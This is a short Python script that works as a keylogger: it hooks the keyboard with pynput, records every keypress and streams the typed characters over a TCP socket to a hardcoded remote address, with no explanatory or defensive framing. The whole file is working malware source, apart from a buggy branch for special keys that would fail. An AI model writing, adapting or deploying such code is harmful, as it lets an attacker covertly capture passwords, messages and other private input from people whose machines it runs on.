from socket import socket
from pynput import keyboard
import socket

IP = "192.168.2.2"
PORT = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
#s.listen(1)
#s.accept()

def on_press(key):
    global s
    try:
        print('Alphanumeric key pressed: {0} '.format(key.char))
        s.send(key.char.encode())
    except AttributeError:
        print('special key pressed: {0}'.format(key))
        s.send(key.char.encode())
        #s.send(key.encode())

def on_release(key):
    print('Key released: {0}'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

    
# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

#s.close()

   

# Collect events until released
#with keyboard.Listener(
#        on_press=on_press,
#        on_release=on_release) as listener:
#    listener.join()